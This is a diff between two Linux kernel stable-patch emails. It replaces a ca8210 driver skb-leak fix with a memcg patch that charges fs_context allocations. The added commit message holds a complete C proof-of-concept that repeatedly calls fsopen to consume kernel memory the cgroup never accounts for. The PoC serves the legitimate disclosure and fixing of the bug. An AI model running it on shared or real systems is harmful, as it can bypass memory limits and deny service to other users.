@@ -2,45 +2,49 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 371F54ABD5C
-	for <lists+linux-kernel@lfdr.de>; Mon,  7 Feb 2022 12:59:54 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 861834ABAAD
+	for <lists+linux-kernel@lfdr.de>; Mon,  7 Feb 2022 12:30:33 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1387864AbiBGLlm (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Mon, 7 Feb 2022 06:41:42 -0500
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:38448 "EHLO
+        id S1383993AbiBGLYW (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Mon, 7 Feb 2022 06:24:22 -0500
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:58042 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1382159AbiBGL3R (ORCPT
+        with ESMTP id S1382330AbiBGLSw (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Mon, 7 Feb 2022 06:29:17 -0500
+        Mon, 7 Feb 2022 06:18:52 -0500
 Received: from dfw.source.kernel.org (dfw.source.kernel.org [139.178.84.217])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 3ECD4C02B667;
-        Mon,  7 Feb 2022 03:27:22 -0800 (PST)
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 8299AC043189;
+        Mon,  7 Feb 2022 03:18:40 -0800 (PST)
 Received: from smtp.kernel.org (relay.kernel.org [52.25.139.140])
         (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
         (No client certificate requested)
-        by dfw.source.kernel.org (Postfix) with ESMTPS id 731C46006F;
-        Mon,  7 Feb 2022 11:27:08 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 4F639C340EB;
-        Mon,  7 Feb 2022 11:27:07 +0000 (UTC)
+        by dfw.source.kernel.org (Postfix) with ESMTPS id 14B7B61447;
+        Mon,  7 Feb 2022 11:18:40 +0000 (UTC)
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id DCDBAC004E1;
+        Mon,  7 Feb 2022 11:18:38 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
-        s=korg; t=1644233227;
-        bh=0G4mg7JrTwEv++ARZxUJpNZ1oLOwrJ8UNREcb0ZZ/f8=;
+        s=korg; t=1644232719;
+        bh=0bwm7FIBxf3TvTOQpHtoB9j5vV7n2mRMKeL1BqS9TsE=;
         h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
-        b=Vl+ow5r63hLe8mibBlDKEtZ+gAEMCt4rq+cTwmL54S/4HdtU8CixprRmn63SE+1NQ
-         piP/m2yasGdOCydmHBesT8QT7q873Y17W5nORwNN4wNKPd9a/auTWaBvyvkvXAgUbn
-         ZtDYYuKTTvD2LF6sAripFtyeiVG2TasIkU1Ke+ok=
+        b=bpJuSc6ldtbPnpDYrkS+GG8Xogs2ADnuDnt1HLGvA3FX6+ahMWiCPKDlVh/w6KVWa
+         9GyuIMKj0LNVabfgj0z1Ir3poqxiYDrK45Z5ijWq3I7REuzVvEaFHPsyX4fUXiTyFy
+         izVJ+lhcCmKLgKt9dJYB6kJDMyxYjcxpS+xpJyCQ=
 From:   Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To:     linux-kernel@vger.kernel.org
 Cc:     Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        stable@vger.kernel.org, Miquel Raynal <miquel.raynal@bootlin.com>,
-        Alexander Aring <aahringo@redhat.com>,
-        Stefan Schmidt <stefan@datenfreihafen.org>
-Subject: [PATCH 5.15 058/110] net: ieee802154: ca8210: Stop leaking skbs
+        stable@vger.kernel.org, Yutian Yang <nglaive@gmail.com>,
+        Shakeel Butt <shakeelb@google.com>,
+        Michal Hocko <mhocko@kernel.org>,
+        Johannes Weiner <hannes@cmpxchg.org>,
+        Vladimir Davydov <vdavydov.dev@gmail.com>,
+        shenwenbo@zju.edu.cn, Andrew Morton <akpm@linux-foundation.org>,
+        Linus Torvalds <torvalds@linux-foundation.org>
+Subject: [PATCH 5.4 15/44] memcg: charge fs_context and legacy_fs_context
 Date:   Mon,  7 Feb 2022 12:06:31 +0100
-Message-Id: <20220207103804.247225937@linuxfoundation.org>
+Message-Id: <20220207103753.651823494@linuxfoundation.org>
 X-Mailer: git-send-email 2.35.1
-In-Reply-To: <20220207103802.280120990@linuxfoundation.org>
-References: <20220207103802.280120990@linuxfoundation.org>
+In-Reply-To: <20220207103753.155627314@linuxfoundation.org>
+References: <20220207103753.155627314@linuxfoundation.org>
 User-Agent: quilt/0.66
 MIME-Version: 1.0
 Content-Type: text/plain; charset=UTF-8
@@ -55,35 +59,107 @@ Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-From: Miquel Raynal <miquel.raynal@bootlin.com>
+From: Yutian Yang <nglaive@gmail.com>
 
-commit 621b24b09eb61c63f262da0c9c5f0e93348897e5 upstream.
+commit bb902cb47cf93b33cd92b3b7a4019330a03ef57f upstream.
 
-Upon error the ieee802154_xmit_complete() helper is not called. Only
-ieee802154_wake_queue() is called manually. We then leak the skb
-structure.
+This patch adds accounting flags to fs_context and legacy_fs_context
+allocation sites so that kernel could correctly charge these objects.
 
-Free the skb structure upon error before returning.
+We have written a PoC to demonstrate the effect of the missing-charging
+bugs.  The PoC takes around 1,200MB unaccounted memory, while it is
+charged for only 362MB memory usage.  We evaluate the PoC on QEMU x86_64
+v5.2.90 + Linux kernel v5.10.19 + Debian buster.  All the limitations
+including ulimits and sysctl variables are set as default.  Specifically,
+the hard NOFILE limit and nr_open in sysctl are both 1,048,576.
 
-Fixes: ded845a781a5 ("ieee802154: Add CA8210 IEEE 802.15.4 device driver")
-Signed-off-by: Miquel Raynal <miquel.raynal@bootlin.com>
-Acked-by: Alexander Aring <aahringo@redhat.com>
-Link: https://lore.kernel.org/r/20220125121426.848337-5-miquel.raynal@bootlin.com
-Signed-off-by: Stefan Schmidt <stefan@datenfreihafen.org>
+/*------------------------- POC code ----------------------------*/
+
+#define _GNU_SOURCE
+#include <sys/types.h>
+#include <sys/file.h>
+#include <time.h>
+#include <sys/wait.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <signal.h>
+#include <sched.h>
+#include <fcntl.h>
+#include <linux/mount.h>
+
+#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+
+#define STACK_SIZE (8 * 1024)
+#ifndef __NR_fsopen
+#define __NR_fsopen 430
+#endif
+static inline int fsopen(const char *fs_name, unsigned int flags)
+{
+        return syscall(__NR_fsopen, fs_name, flags);
+}
+
+static char thread_stack[512][STACK_SIZE];
+
+int thread_fn(void* arg)
+{
+  for (int i = 0; i< 800000; ++i) {
+    int fsfd = fsopen("nfs", FSOPEN_CLOEXEC);
+    if (fsfd == -1) {
+      errExit("fsopen");
+    }
+  }
+  while(1);
+  return 0;
+}
+
+int main(int argc, char *argv[]) {
+  int thread_pid;
+  for (int i = 0; i < 1; ++i) {
+    thread_pid = clone(thread_fn, thread_stack[i] + STACK_SIZE, \
+      SIGCHLD, NULL);
+  }
+  while(1);
+  return 0;
+}
+
+/*-------------------------- end --------------------------------*/
+
+Link: https://lkml.kernel.org/r/1626517201-24086-1-git-send-email-nglaive@gmail.com
+Signed-off-by: Yutian Yang <nglaive@gmail.com>
+Reviewed-by: Shakeel Butt <shakeelb@google.com>
+Cc: Michal Hocko <mhocko@kernel.org>
+Cc: Johannes Weiner <hannes@cmpxchg.org>
+Cc: Vladimir Davydov <vdavydov.dev@gmail.com>
+Cc: <shenwenbo@zju.edu.cn>
+Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
+Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- drivers/net/ieee802154/ca8210.c |    1 +
- 1 file changed, 1 insertion(+)
+ fs/fs_context.c |    4 ++--
+ 1 file changed, 2 insertions(+), 2 deletions(-)
 
---- a/drivers/net/ieee802154/ca8210.c
-+++ b/drivers/net/ieee802154/ca8210.c
-@@ -1771,6 +1771,7 @@ static int ca8210_async_xmit_complete(
- 			status
- 		);
- 		if (status != MAC_TRANSACTION_OVERFLOW) {
-+			dev_kfree_skb_any(priv->tx_skb);
- 			ieee802154_wake_queue(priv->hw);
- 			return 0;
- 		}
+--- a/fs/fs_context.c
++++ b/fs/fs_context.c
+@@ -258,7 +258,7 @@ static struct fs_context *alloc_fs_conte
+ 	struct fs_context *fc;
+ 	int ret = -ENOMEM;
+ 
+-	fc = kzalloc(sizeof(struct fs_context), GFP_KERNEL);
++	fc = kzalloc(sizeof(struct fs_context), GFP_KERNEL_ACCOUNT);
+ 	if (!fc)
+ 		return ERR_PTR(-ENOMEM);
+ 
+@@ -686,7 +686,7 @@ const struct fs_context_operations legac
+  */
+ static int legacy_init_fs_context(struct fs_context *fc)
+ {
+-	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL);
++	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL_ACCOUNT);
+ 	if (!fc->fs_private)
+ 		return -ENOMEM;
+ 	fc->ops = &legacy_fs_context_ops;
 
 
